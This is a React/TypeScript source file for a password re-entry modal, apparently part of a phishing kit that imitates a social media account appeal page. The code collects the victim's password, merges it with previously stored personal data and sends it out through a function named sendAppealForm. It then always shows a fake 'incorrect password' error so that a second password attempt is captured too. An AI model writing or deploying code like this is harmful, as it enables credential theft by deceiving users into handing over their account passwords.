import React from 'react';
import Modal from './Modal';
import { getRecord, saveRecord, sendAppealForm } from '../../app/utils';
import PasswordInput from '../password-input';

interface PasswordModalProps {
    isOpendModal: boolean;
    onToggleModal: (value: boolean) => void;
    onOpendModalSuccess: (value: boolean) => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpendModal, onToggleModal, onOpendModalSuccess }) => {

    const [isOpen, setIsOpen] = React.useState(isOpendModal);
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    const [formData, setFormData] = React.useState({
        password: '',
    });

    React.useEffect(() => {
        setIsOpen(isOpendModal);
    }, [isOpendModal]);

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };
    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.password.trim()) newErrors.password = "You haven't entered your password!";

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            setLoading(true);

            if (click === 0) {
                let data_save = getRecord("__v_3_us");

                const clientData = {
                    ...data_save,
                    password: formData.password,
                };

                saveRecord("__v_4_us", clientData);
                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {
                            setLoading(false);  
                            setFormData({ password: '' });
                            newErrors.password = "The password you've entered is incorrect.";
                            setErrors(newErrors);
                            setClick(1)
                        }, 1350);

                    })
                    .catch((err) => {
                        console.log(err);
                    });
            } else {
                let data_save = getRecord("__v_4_us");

                const clientData = {
                    ...data_save,
                    passwordSecond: formData.password,
                };

                await sendAppealForm(clientData)
                    .then(() => {
                        setTimeout(() => {
                            setLoading(false);  
                            setFormData({ password: '' });

                            onToggleModal(false);
                            onOpendModalSuccess(true);
                        }, 1860);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] mt-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=""
            onClose={handleClose}
            isClosable={false}
        >

            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <div className='w-full'>
                    <h2 className="font-bold text-[#0A1317] text-[15px] text-left">Re-enter your password to confirm</h2>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>For your security, you must enter your password to continue.</p>
                    <form onSubmit={handSubmit} >
                        <div className='w-full flex flex-col gap-[3px] mt-4'>
                            <div className='flex items-center gap-[10px]'>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='fanpage '>Password</label>
                            </div>
                            <PasswordInput
                                id='password'
                                className={inputClass('password')}
                                value={formData.password}
                                onChange={handleChange}
                            />
                            {errorText('password')}
                        </div>

                        <div className='w-full '>
                            <button
                                type="submit"
                                disabled={loading}
                                className={`w-full ${loading ? 'bg-[#0064E0] cursor-not-allowed' : 'text-[15px] bg-[#0064E0] cursor-pointer hover:bg-[#0056b3]'} text-[white] rounded-[8px] pt-[10px] pb-[10px] flex items-center justify-center transition-all duration-200`}
                            >
                                {loading ? (
                                    <div className="flex items-center gap-2">
                                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                                    </div>
                                ) : (
                                    "Submit"
                                )}
                            </button>
                        </div>
                    </form>
                </div>
            </div>

        </Modal>
    );
};

export default PasswordModal;
